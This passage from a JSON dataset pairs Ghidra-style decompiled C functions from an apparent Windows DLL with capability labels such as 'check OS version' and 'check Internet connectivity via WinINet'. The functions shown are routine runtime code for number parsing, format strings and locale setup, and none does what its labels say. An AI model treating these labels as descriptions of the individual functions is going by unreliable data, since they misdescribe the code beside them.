if (0xf < uVar12) {\n                        pcVar16 = pcVar14;\n                    }\n                    puVar21 = pcVar16 + uStack424;\n                    uStack424 = uStack424 + 1;\n                    *puVar21 = 0;\n                }\n                else {\n                    puVar24 = NULL;\n                    fcn.180013eb0(&stack0xfffffffffffffe48, 1);\n                }\n                iVar6 = iVar6 + 1;\ncode_r0x000180071054:\n                pcVar14 = CONCAT62(Stack438, CONCAT11(uStack439, cStack440));\n                uVar12 = uStack416;\n            }\n            fcn.180071238(piVar22);\n            cVar2 = fcn.1800738b4(piVar22, puStack472);\n        } while (cVar2 == '\\0');\n        pcVar20 = pcStack480;\n        pcVar16 = pcStack488;\n        cVar2 = cStack496;\n        if (iVar6 != 0) {\n            pcVar10 = &stack0xfffffffffffffe48;\n            if (0xf < uVar12) {\n                pcVar10 = pcVar14;\n            }\n            if (pcVar10[iVar6] < '\\x01') {\n                cVar2 = '\\0';\n            }\n            else {\n                iVar6 = iVar6 + 1;\n            }\n        }\n    }\n    puVar19 = &stack0xfffffffffffffe68;\n    if (0xf < pcStack384) {\n        puVar19 = puStack408;\n    }\n    if (cVar2 != '\\0') {\n        while (iVar6 != 0) {\n            uVar23 = *puVar19;\n            puVar24 = puVar24 & 0xffffffffffffff00 | uVar23;\n            if (uVar23 == 0x7f) break;\n            iVar6 = iVar6 + -1;\n            if (iVar6 != 0) {\n                pcVar10 = &stack0xfffffffffffffe48;\n                if (0xf < uVar12) {\n                    pcVar10 = pcVar14;\n                }\n                if (uVar23 != pcVar10[iVar6]) goto code_r0x00018007111a;\n            }\n            if (iVar6 == 0) {\n                pcVar10 = &stack0xfffffffffffffe48;\n                if (0xf < uVar12) {\n                    pcVar10 = pcVar14;\n                }\n                if (uVar23 < *pcVar10) goto code_r0x00018007111a;\n            }\n            if ('\\0' < puVar19[1]) {\n                puVar19 = puVar19 + 1;\n            }\n        }\n        pcVar20 = pcVar16;\n        if (cStack494 == '\\0') {\n            *pcVar16 = '0';\n            pcVar20 = pcVar16 + 1;\n        }\n    }\ncode_r0x00018007111a:\n    *pcVar20 = '\\0';\n    if (0xf < uVar12) {\n        pcVar16 = pcVar14;\n        if (0xfff < uVar12 + 1) {\n            pcVar20 = uVar12 + 0x28;\n            pcVar16 = *(pcVar14 + -8);\n            if (0x1f < pcVar14 + (-8 - pcVar16)) goto code_r0x0001800711b6;\n        }\n        fcn.18008fb24(pcVar16);\n    }\n    if (0xf < pcStack384) {\n        puVar19 = puStack408;\n        if (0xfff < pcStack384 + 1) {\n            pcVar20 = pcStack384 + 0x28;\n            puVar19 = *(puStack408 + -8);\n            if (0x1f < puStack408 + (-8 - puVar19)) {\n                fcn.1800b3528();\ncode_r0x0001800711b6:\n                fcn.1800b3528();\n                *pcVar20 = '%';\n                pcVar16 = pcVar20 + 1;\n                if ((puVar24 & 0x20) != 0) {\n                    *pcVar16 = '+';\n                    pcVar16 = pcVar20 + 2;\n                }\n                if ((puVar24 & 8) != 0) {\n                    *pcVar16 = '#';\n                    pcVar16 = pcVar16 + 1;\n                }\n                puVar21 = pcVar16 + 1;\n                if (*pcStack384 == 'L') {\n                    *pcVar16 = 'I';\n                    *puVar21 = 0x3436;\n                    puVar21 = pcVar16 + 3;\n                }\n                else {\n                    *pcVar16 = *pcStack384;\n                }\n                uVar11 = puVar24 & 0xe00;\n                if (uVar11 == 0x400) {\n                    uVar23 = 0x6f;\n                }\n                else if (uVar11 == 0x800) {\n                    uVar23 = ~(puVar24 << 3) & 0x20U | 0x58;\n                }\n                else {\n                    uVar23 = pcStack384[1];\n                }\n                *puVar21 = uVar23;\n                *(puVar21 + 1) = 0;\n                return pcVar20;\n            }\n        }\n        fcn.18008fb24(puVar19);\n    }\n    pcVar16 = fcn.18008fb00(uStack344 ^ &stack0xfffffffffffffde0);\n    return pcVar16;\n}\n",
        "token_count": 13791
    },
    "180070ad": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.180070adc(ulong noname_0, char *arg2, int64_t *arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    char cVar3;\n    ulong uVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    ushort *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uchar *puVar10;\n    int32_t iVar11;\n    ulong ****ppppuVar12;\n    char *pcVar13;\n    int64_t iVar14;\n    uint8_t uVar15;\n    uint8_t *puVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    uint64_t uVar19;\n    char *pcVar20;\n    uint32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    uchar auStack264 [48];\n    char cStack216;\n    uint8_t uStack215;\n    char cStack214;\n    uint32_t uStack212;\n    char *pcStack208;\n    char *pcStack200;\n    ulong uStack192;\n    uint64_t uStack184;\n    char *pcStack176;\n    ulong uStack168;\n    char cStack160;\n    uchar uStack159;\n    unkbyte6 Stack158;\n    uint64_t uStack144;\n    uint64_t uStack136;\n    ulong ****appppuStack128 [2];\n    int64_t iStack112;\n    char *pcStack104;\n    uint8_t auStack96 [22];\n    char cStack74;\n    char cStack73;\n    char cStack72;\n    char cStack71;\n    uchar auStack70 [6];\n    uint64_t uStack64;\n    \n    uStack168 = 0xfffffffffffffffe;\n    uStack64 = *0x180123080 ^ auStack264;\n    pcStack200 = arg2;\n    uStack192 = arg4;\n    uVar4 = fcn.18006e658(in_stack_00000030);\n    (**0x1800de8f0)(uVar4, appppuStack128);\n    iVar17 = 0;\n    if (iStack112 == 0) {\n        uStack215 = 0;\n    }\n    else {\n        uStack215 = (**0x1800de8f0)(uVar4);\n    }\n    uVar4 = fcn.180012470(in_stack_00000030);\n    puVar16 = auStack96;\n    (**0x1800de8f0)(uVar4, 0x1800df798);\n    uVar4 = uStack192;\n    pcStack208 = arg2;\n    cVar2 = fcn.1800738b4(arg3, uStack192);\n    if (cVar2 == '\\0') {\n        cVar2 = *(arg3 + 1);\n        if (cVar2 == '\\0') {\n            iVar14 = *arg3;\n            if (iVar14 == 0) {\ncode_r0x000180070bf8:\n                *arg3 = 0;\n            }\n            else {\n                iVar11 = iVar17;\n                if (**(iVar14 + 0x38) != NULL) {\n                    iVar11 = **(iVar14 + 0x50);\n                }\n                if (iVar11 < 1) {\n                    uVar9 = (**0x1800de8f0)();\n                }\n                else {\n                    uVar9 = ***(iVar14 + 0x38);\n                }\n                if (uVar9 == 0xffffffff) goto code_r0x000180070bf8;\n                *(arg3 + 9) = uVar9;\n            }\n            *(arg3 + 1) = 1;\n            cVar2 = '\\x01';\n        }\n        cVar3 = *(arg3 + 9);\n        if (cVar3 == cStack73) {\n            *arg2 = '+';\n        }\n        else {\n            if (cVar2 == '\\0') {\n                iVar14 = *arg3;\n                if (iVar14 == 0) {\ncode_r0x000180070c5d:\n                    *arg3 = 0;\n                }\n                else {\n                    puVar16 = **(iVar14 + 0x38);\n                    if (puVar16 != NULL) {\n                        iVar17 = **(iVar14 + 0x50);\n                    }\n                    if (iVar17 < 1) {\n                        uVar9 = (**0x1800de8f0)();\n                        cVar3 = *(arg3 + 9);\n                    }\n                    else {\n                        uVar9 = *puVar16;\n                    }\n                    if (uVar9 == 0xffffffff) goto code_r0x000180070c5d;\n                    cVar3 = uVar9;\n                    *(arg3 + 9) = cVar3;\n                }\n                *(arg3 + 1) = 1;\n            }\n            if (cVar3 != cStack74) goto code_r0x000180070c7e;\n            *arg2 = '-';\n        }\n        arg2 = arg2 + 1;\n        pcStack208 = arg2;\n        fcn.180071238(arg3);\n    }\ncode_r0x000180070c7e:\n    uVar8 = in_stack_00000028 & 0xe00;\n    uStack184 = 10;\n    uVar18 = 0x10;\n    uVar9 = -(uVar8 != 0) & 10;\n    if (uVar8 == 0x800) {\n        uVar9 = uVar18;\n    }\n    if (uVar8 == 0x400) {\n        uVar9 = 8;\n    }\n    cStack160 = '\\0';\n    cStack216 = '\\0';\n    cStack214 = '\\0';\n    uStack212 = uVar9;\n    cVar2 = fcn.1800738b4(arg3, uVar4);\n    if (cVar2 == '\\0') {\n        if (*(arg3 + 1) == '\\0') {\n            iVar14 = *arg3;\n            if (iVar14 == 0) {\ncode_r0x000180070d21:\n                *arg3 = 0;\n            }\n            else {\n                if (**(iVar14 + 0x38) == NULL) {\n                    iVar17 = 0;\n                }\n                else {\n                    iVar17 = **(iVar14 + 0x50);\n                }\n                if (iVar17 < 1) {\n                    uVar8 = (**0x1800de8f0)();\n                }\n                else {\n                    uVar8 = ***(iVar14 + 0x38);\n                }\n                if (uVar8 == 0xffffffff) goto code_r0x000180070d21;\n                *(arg3 + 9) = uVar8;\n            }\n            *(arg3 + 1) = 1;\n        }\n        if (*(arg3 + 9) != auStack96[0]) goto code_r0x000180070e4c;\n        cStack160 = '\\x01';\n        cStack216 = '\\x01';\n        fcn.180071238(arg3);\n        cVar2 = fcn.1800738b4(arg3, uVar4);\n        if (cVar2 != '\\0') {\ncode_r0x000180070e34:\n            uStack212 = uVar9;\n            if (uVar9 == 0) {\n                uStack212 = 8;\n                uVar9 = uStack212;\n            }\n            goto code_r0x000180070e4c;\n        }\n        cVar2 = *(arg3 + 1);\n        if (cVar2 == '\\0') {\n            iVar14 = *arg3;\n            if (iVar14 == 0) {\ncode_r0x000180070d9e:\n                *arg3 = 0;\n            }\n            else {\n                if (**(iVar14 + 0x38) == NULL) {\n                    iVar17 = 0;\n                }\n                else {\n                    iVar17 = **(iVar14 + 0x50);\n                }\n                if (iVar17 < 1) {\n                    uVar8 = (**0x1800de8f0)();\n                }\n                else {\n                    uVar8 = ***(iVar14 + 0x38);\n                }\n                if (uVar8 == 0xffffffff) goto code_r0x000180070d9e;\n                *(arg3 + 9) = uVar8;\n            }\n            *(arg3 + 1) = 1;\n            cVar2 = '\\x01';\n        }\n        cVar3 = *(arg3 + 9);\n        if (cVar3 != cStack71) {\n            if (cVar2 == '\\0') {\n                iVar14 = *arg3;\n                if (iVar14 == 0) {\ncode_r0x000180070dff:\n                    *arg3 = 0;\n                }\n                else {\n                    puVar16 = **(iVar14 + 0x38);\n                    if (puVar16 == NULL) {\n                        iVar17 = 0;\n                    }\n                    else {\n                        iVar17 = **(iVar14 + 0x50);\n                    }\n                    if (iVar17 < 1) {\n                        uVar8 = (**0x1800de8f0)();\n                        cVar3 = *(arg3 + 9);\n                    }\n                    else {\n                        uVar8 = *puVar16;\n                    }\n                    if (uVar8 == 0xffffffff) goto code_r0x000180070dff;\n                    cVar3 = uVar8;\n                    *(arg3 + 9) = cVar3;\n                }\n                *(arg3 + 1) = 1;\n            }\n            if (cVar3 != cStack72) goto code_r0x000180070e34;\n        }\n        if ((uVar9 & 0xffffffef) != 0) goto code_r0x000180070e34;\n        uStack212 = 0x10;\n        cStack160 = '\\0';\n        cStack216 = '\\0';\n        fcn.180071238(arg3);\ncode_r0x000180070e56:\n        uStack184 = 0x16;\n        if (uVar18 == 8) {\n            uStack184 = 8;\n        }\n    }\n    else {\ncode_r0x000180070e4c:\n        uVar18 = uVar9;\n        if ((uVar18 != 0) && (uVar18 != 10)) goto code_r0x000180070e56;\n    }\n    pcVar20 = pcStack200;\n    uVar19 = 0xf;\n    uStack136 = 0xf;\n    uStack159 = 0;\n    uStack144 = 1;\n    iVar14 = 0;\n    pcStack176 = pcStack200 + 0x1f;\n    cVar3 = fcn.1800738b4(arg3, uStack192);\n    pcVar13 = pcStack176;\n    pcVar6 = CONCAT62(Stack158, CONCAT11(uStack159, cStack160));\n    cVar2 = cStack216;\n    if (cVar3 == '\\0') {\n        do {\n            cVar2 = *(arg3 + 1);\n            if (cVar2 == '\\0') {\n                iVar1 = *arg3;\n                if (iVar1 == 0) {\ncode_r0x000180070ef7:\n                    *arg3 = 0;\n                }\n                else {\n                    if (**(iVar1 + 0x38) == NULL) {\n                        iVar17 = 0;\n                    }\n                    else {\n                        iVar17 = **(iVar1 + 0x50);\n                    }\n                    if (iVar17 < 1) {\n                        uVar9 = (**0x1800de8f0)();\n                    }\n                    else {\n                        uVar9 = ***(iVar1 + 0x38);\n                    }\n                    if (uVar9 == 0xffffffff) goto code_r0x000180070ef7;\n                    *(arg3 + 9) = uVar9;\n                }\n                *(arg3 + 1) = 1;\n                cVar2 = '\\x01';\n            }\n            uVar15 = *(arg3 + 9);\n            puVar5 = fcn.1800ae430(auStack96, uVar15, 0x1a);\n            puVar10 = auStack70;\n            if (puVar5 != NULL) {\n                puVar10 = puVar5;\n            }\n            if (puVar10 - auStack96 < uStack184) {\n                cVar2 = *((puVar10 - auStack96) + 0x1800df798);\n                *pcStack208 = cVar2;\n                if (((cStack214 != '\\0') || (cVar2 != '0')) && (pcStack208 < pcVar13)) {\n                    pcStack208 = pcStack208 + 1;\n                    cStack214 = '\\x01';\n                }\n                cStack216 = '\\x01';\n                pcVar20 = &cStack160;\n                if (0xf < uVar19) {\n                    pcVar20 = pcVar6;\n                }\n                if (pcVar20[iVar14] != '\\x7f') {\n                    pcVar20 = &cStack160;\n                    if (0xf < uVar19) {\n                        pcVar20 = pcVar6;\n                    }\n                    pcVar20[iVar14] = pcVar20[iVar14] + '\\x01';\n                    goto code_r0x000180071054;\n                }\n            }\n            else {\n                pcVar20 = &cStack160;\n                if (0xf < uVar19) {\n                    pcVar20 = pcVar6;\n                }\n                if ((pcVar20[iVar14] == '\\0') || (puVar16 = puVar16 & 0xffffffffffffff00 | uStack215,  uStack215 == 0))\n                break;\n                if (cVar2 == '\\0') {\n                    iVar1 = *arg3;\n                    if (iVar1 == 0) {\ncode_r0x00018007100a:\n                        *arg3 = 0;\n                        uVar9 = uVar15;\n                    }\n                    else {\n                        if (**(iVar1 + 0x38) == NULL) {\n                            iVar17 = 0;\n                        }\n                        else {\n                            iVar17 = **(iVar1 + 0x50);\n                        }\n                        if (iVar17 < 1) {\n                            uVar9 = (**0x1800de8f0)();\n                            uVar15 = *(arg3 + 9);\n                            puVar16 = puVar16 & 0xffffffffffffff00 | uStack215;\n                        }\n                        else {\n                            uVar9 = ***(iVar1 + 0x38);\n                        }\n                        if (uVar9 == 0xffffffff) goto code_r0x00018007100a;\n                        *(arg3 + 9) = uVar9;\n                    }\n                    uVar15 = uVar9;\n                    *(arg3 + 1) = 1;\n                }\n                if (uVar15 != puVar16) break;\n                if (uStack144 < uVar19) {\n                    pcVar20 = &cStack160;\n                    if (0xf < uVar19) {\n                        pcVar20 = pcVar6;\n                    }\n                    puVar7 = pcVar20 + uStack144;\n                    uStack144 = uStack144 + 1;\n                    *puVar7 = 0;\n                }\n                else {\n                    puVar16 = NULL;\n                    fcn.180013eb0(&cStack160, 1);\n                }\n                iVar14 = iVar14 + 1;\ncode_r0x000180071054:\n                pcVar6 = CONCAT62(Stack158, CONCAT11(uStack159, cStack160));\n                uVar19 = uStack136;\n            }\n            fcn.180071238(arg3);\n            cVar2 = fcn.1800738b4(arg3, uStack192);\n        } while (cVar2 == '\\0');\n        pcVar20 = pcStack200;\n        arg2 = pcStack208;\n        cVar2 = cStack216;\n        if (iVar14 != 0) {\n            pcVar13 = &cStack160;\n            if (0xf < uVar19) {\n                pcVar13 = pcVar6;\n            }\n            if (pcVar13[iVar14] < '\\x01') {\n                cVar2 = '\\0';\n            }\n            else {\n                iVar14 = iVar14 + 1;\n            }\n        }\n    }\n    ppppuVar12 = appppuStack128;\n    if (0xf < pcStack104) {\n        ppppuVar12 = appppuStack128[0];\n    }\n    if (cVar2 != '\\0') {\n        while (iVar14 != 0) {\n            uVar15 = *ppppuVar12;\n            puVar16 = puVar16 & 0xffffffffffffff00 | uVar15;\n            if (uVar15 == 0x7f) break;\n            iVar14 = iVar14 + -1;\n            if (iVar14 != 0) {\n                pcVar13 = &cStack160;\n                if (0xf < uVar19) {\n                    pcVar13 = pcVar6;\n                }\n                if (uVar15 != pcVar13[iVar14]) goto code_r0x00018007111a;\n            }\n            if (iVar14 == 0) {\n                pcVar13 = &cStack160;\n                if (0xf < uVar19) {\n                    pcVar13 = pcVar6;\n                }\n                if (uVar15 < *pcVar13) goto code_r0x00018007111a;\n            }\n            if ('\\0' < *(ppppuVar12 + 1)) {\n                ppppuVar12 = ppppuVar12 + 1;\n            }\n        }\n        pcVar20 = arg2;\n        if (cStack214 == '\\0') {\n            *arg2 = '0';\n            pcVar20 = arg2 + 1;\n        }\n    }\ncode_r0x00018007111a:\n    *pcVar20 = '\\0';\n    if (0xf < uVar19) {\n        pcVar20 = pcVar6;\n        if (0xfff < uVar19 + 1) {\n            pcVar13 = uVar19 + 0x28;\n            pcVar20 = *(pcVar6 + -8);\n            if (0x1f < pcVar6 + (-8 - pcVar20)) goto code_r0x0001800711b6;\n        }\n        fcn.18008fb24(pcVar20);\n    }\n    if (0xf < pcStack104) {\n        ppppuVar12 = appppuStack128[0];\n        if (0xfff < pcStack104 + 1) {\n            pcVar13 = pcStack104 + 0x28;\n            ppppuVar12 = appppuStack128[0][-1];\n            if (0x1f < appppuStack128[0] + (-8 - ppppuVar12)) {\n                fcn.1800b3528();\ncode_r0x0001800711b6:\n                fcn.1800b3528();\n                *pcVar13 = '%';\n                pcVar6 = pcVar13 + 1;\n                if ((puVar16 & 0x20) != 0) {\n                    *pcVar6 = '+';\n                    pcVar6 = pcVar13 + 2;\n                }\n                if ((puVar16 & 8) != 0) {\n                    *pcVar6 = '#';\n                    pcVar6 = pcVar6 + 1;\n                }\n                puVar7 = pcVar6 + 1;\n                if (*pcStack104 == 'L') {\n                    *pcVar6 = 'I';\n                    *puVar7 = 0x3436;\n                    puVar7 = pcVar6 + 3;\n                }\n                else {\n                    *pcVar6 = *pcStack104;\n                }\n                uVar9 = puVar16 & 0xe00;\n                if (uVar9 == 0x400) {\n                    uVar15 = 0x6f;\n                }\n                else if (uVar9 == 0x800) {\n                    uVar15 = ~(puVar16 << 3) & 0x20U | 0x58;\n                }\n                else {\n                    uVar15 = pcStack104[1];\n                }\n                *puVar7 = uVar15;\n                *(puVar7 + 1) = 0;\n                return pcVar13;\n            }\n        }\n        fcn.18008fb24(ppppuVar12);\n    }\n    pcVar6 = fcn.18008fb00(uStack64 ^ auStack264);\n    return pcVar6;\n}\n",
        "token_count": 4525
    },
    "1800712a": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1800712a4(int64_t arg1)\n\n{\n    code *pcVar1;\n    uchar uVar2;\n    ulong *puVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    uchar *puVar8;\n    char in_R8B;\n    uchar auStack72 [48];\n    \n    puVar3 = fcn.1800bb800(arg1);\n    fcn.180074580(auStack72);\n    *(arg1 + 0x10) = 0;\n    *(arg1 + 0x20) = 0;\n    *(arg1 + 0x28) = 0;\n    fcn.180074580(auStack72);\n    puVar8 = 0x1800f454f;\n    if (in_R8B == '\\0') {\n        puVar8 = puVar3[2];\n    }\n    iVar5 = -1;\n    do {\n        iVar6 = iVar5;\n        iVar5 = iVar6 + 1;\n    } while (puVar8[iVar5] != '\\0');\n    iVar6 = iVar6 + 2;\n    iVar5 = fcn.1800bb064(iVar6, 1);\n    if (iVar5 != 0) {\n        if (iVar6 != 0) {\n            iVar4 = iVar5 - puVar8;\n            do {\n                puVar8[iVar4] = *puVar8;\n                puVar8 = puVar8 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n        }\n        *(arg1 + 0x10) = iVar5;\n        pcVar7 = \"false\";\n        iVar6 = 6;\n        iVar5 = fcn.1800bb064(6, 1);\n        if (iVar5 != 0) {\n            do {\n                pcVar7[iVar5 + -0x1800df580] = *pcVar7;\n                pcVar7 = pcVar7 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            *(arg1 + 0x20) = iVar5;\n            pcVar7 = \"true\";\n            iVar6 = 5;\n            iVar5 = fcn.1800bb064(5, 1);\n            if (iVar5 != 0) {\n                do {\n                    pcVar7[iVar5 + -0x1800df588] = *pcVar7;\n                    pcVar7 = pcVar7 + 1;\n                    iVar6 = iVar6 + -1;\n                } while (iVar6 != 0);\n                *(arg1 + 0x28) = iVar5;\n                if (in_R8B == '\\0') {\n                    *(arg1 + 0x18) = **puVar3;\n                    uVar2 = *puVar3[1];\n                }\n                else {\n                    *(arg1 + 0x18) = 0x2e;\n                    uVar2 = 0x2c;\n                }\n                *(arg1 + 0x19) = uVar2;\n                return;\n            }\n        }\n    }\n    fcn.18006df20();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 724
    },
    "18007407": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.180074078(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    \n    uVar4 = arg2 | 1;\n    if ((arg2 & 0x40) == 0) {\n        uVar4 = arg2;\n    }\n    uVar1 = uVar4 | 2;\n    if ((uVar4 & 8) == 0) {\n        uVar1 = uVar4;\n    }\n    iVar2 = 0;\n    iVar3 = 0;\n    uVar4 = 1;\n    do {\n        if (uVar4 == (uVar1 & 0xffffff3b)) break;\n        uVar4 = *(iVar3 * 4 + 0x1800df9bc);\n        iVar3 = iVar3 + 1;\n        iVar2 = iVar2 + 1;\n    } while (uVar4 != 0);\n    if (*(iVar2 * 4 + 0x1800df9b8) != 0) {\n        if ((((arg2 & 0x80) == 0) || ((uVar1 & 10) == 0)) ||\n           (iVar3 = fcn.1800bde74(arg1, *0x1800df8f0, arg3),  iVar3 == 0)) {\n            iVar3 = fcn.1800bde74(arg1, *(iVar2 * 8 + 0x1800df8f0), arg3);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            if ((arg2 & 4) == 0) {\n                return iVar3;\n            }\n            iVar2 = fcn.1800b32ec(iVar3, 0, 2);\n            if (iVar2 == 0) {\n                return iVar3;\n            }\n        }\n        fcn.1800b10bc(iVar3);\n    }\n    return 0;\n}\n",
        "token_count": 452
    },
    "180074ca": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180074afa)\n// WARNING: Removing unreachable block (ram,0x000180074b00)\n// WARNING: Removing unreachable block (ram,0x000180074b02)\n// WARNING: Removing unreachable block (ram,0x000180074b08)\n// WARNING: Removing unreachable block (ram,0x000180074b21)\n// WARNING: Removing unreachable block (ram,0x000180074b23)\n// WARNING: Removing unreachable block (ram,0x000180074b2d)\n// WARNING: Removing unreachable block (ram,0x000180074b38)\n// WARNING: Removing unreachable block (ram,0x000180074b60)\n// WARNING: Removing unreachable block (ram,0x000180074b62)\n// WARNING: Removing unreachable block (ram,0x000180074b6d)\n// WARNING: Removing unreachable block (ram,0x000180074ba0)\n// WARNING: Removing unreachable block (ram,0x000180074ba6)\n// WARNING: Removing unreachable block (ram,0x000180074bad)\n\nvoid fcn.180074ca4(uint32_t *arg1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uchar auStack88 [48];\n    uint64_t uStack40;\n    \n    uStack40 = *0x180123080 ^ auStack88;\n    if ((*arg1 & 0xfffffeff) == 1) {\n        uVar1 = (**0x1800de4e8)();\n        if (arg1[0x12] != uVar1) {\n            (**0x1800de8f0)();\n            uVar1 = (**0x1800de4e8)();\n            arg1[0x12] = uVar1;\n        }\n        arg1[0x13] = arg1[0x13] + 1;\n    }\n    else {\n        uVar1 = (**0x1800de4e8)();\n        if (arg1[0x12] != uVar1) {\n            (**0x1800de8f0)();\n        }\n        uVar1 = arg1[0x13];\n        uVar2 = uVar1 + 1;\n        arg1[0x13] = uVar2;\n        if (uVar2 < 2) {\n            uVar1 = (**0x1800de4e8)();\n            arg1[0x12] = uVar1;\n        }\n        else if ((*arg1 & 0x100) == 0) {\n            arg1[0x13] = uVar1;\n        }\n    }\n    fcn.18008fb00(uStack40 ^ auStack88);\n    return;\n}\n",
        "token_count": 594
    },
    "18007564": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid fcn.180075640(ulong arg1, ulong arg2, uint64_t arg3, char *arg4)\n\n{\n    code *pcVar1;\n    ulong arg1_00;\n    char cVar2;\n    uint16_t uVar3;\n    uchar *puVar4;\n    uchar uVar5;\n    char *pcVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uchar *puVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    uchar auStack168 [32];\n    char cStack136;\n    uint uStack132;\n    ulong uStack128;\n    ulong uStack120;\n    ulong uStack112;\n    uchar uStack104;\n    unkbyte7 Stack103;\n    uint64_t var_50h;\n    uint64_t var_48h;\n    uint64_t var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    uStack112 = 0xfffffffffffffffe;\n    var_40h = *0x180123080 ^ auStack168;\n    if (*arg4 != '\\0') {\n        cVar2 = *arg4;\n        pcVar6 = arg4;\n        uVar7 = arg3;\n        do {\n            arg3 = uVar7 + 1;\n            if (cVar2 != *arg4) {\n                arg3 = uVar7;\n            }\n            pcVar6 = pcVar6 + 1;\n            cVar2 = *pcVar6;\n            uVar7 = arg3;\n        } while (cVar2 != '\\0');\n    }\n    var_50h = 0;\n    var_48h = 0xf;\n    uStack104 = 0;\n    uStack128 = arg1;\n    uStack120 = arg2;\n    if (arg3 < 0x10) {\n        var_50h = arg3;\n        fcn.1800ae290(&uStack104, 0, arg3);\n        (&uStack104)[arg3] = 0;\n    }\n    else {\n        fcn.180014010(&uStack104, arg3);\n    }\n    uStack132 = 0xfffffffe;\n    uVar10 = 1;\n    puVar9 = CONCAT71(Stack103, uStack104);\n    uVar7 = var_48h;\n    while( true ) {\n        cStack136 = '\\0';\n        iVar8 = 0;\n        uVar11 = 0;\n        if (arg3 == 0) break;\n        do {\n            for (; (arg4[iVar8] != '\\0' && (arg4[iVar8] != *arg4)); iVar8 = iVar8 + 1) {\n            }\n            puVar4 = &uStack104;\n            if (0xf < uVar7) {\n                puVar4 = puVar9;\n            }\n            if (puVar4[uVar11] == '\\0') {\n                iVar8 = iVar8 + uVar10;\n                if ((arg4[iVar8] == *arg4) || (arg4[iVar8] == '\\0')) {\n                    uStack132 = uVar11;\n                }\n                else {\n                    cVar2 = fcn.1800890e8(uStack128, uStack120);\n                    if ((cVar2 == '\\0') && (uVar3 = fcn.1800783e4(uStack128),  arg4[iVar8] == uVar3)) {\n                        cStack136 = '\\x01';\n                        goto code_r0x000180075805;\n                    }\n                }\n                puVar4 = &uStack104;\n                if (0xf < uVar7) {\n                    puVar4 = puVar9;\n                }\n                uVar5 = 0x7f;\n                if (uVar10 < 0x7f) {\n                    uVar5 = uVar10;\n                }\n                puVar4[uVar11] = uVar5;\n                puVar9 = CONCAT71(Stack103, uStack104);\n                uVar7 = var_48h;\n            }\n            else {\n                puVar4 = &uStack104;\n                if (0xf < uVar7) {\n                    puVar4 = puVar9;\n                }\n                iVar8 = iVar8 + puVar4[uVar11];\n            }\ncode_r0x000180075805:\n            arg1_00 = uStack128;\n            uVar11 = uVar11 + 1;\n        } while (uVar11 < arg3);\n        if ((cStack136 == '\\0') || (cVar2 = fcn.1800890e8(uStack128, uStack120),  cVar2 != '\\0')) break;\n        uVar10 = uVar10 + 1;\n        fcn.18007f190(arg1_00);\n        uStack132 = 0xffffffff;\n    }\n    if (0xf < uVar7) {\n        puVar4 = puVar9;\n        if ((0xfff < uVar7 + 1) && (puVar4 = *(puVar9 + -8),  0x1f < puVar9 + (-8 - puVar4))) {\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(puVar4);\n    }\n    fcn.18008fb00(var_40h ^ auStack168);\n    return;\n}\n",
        "token_count": 1268
    },
    "180075be": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
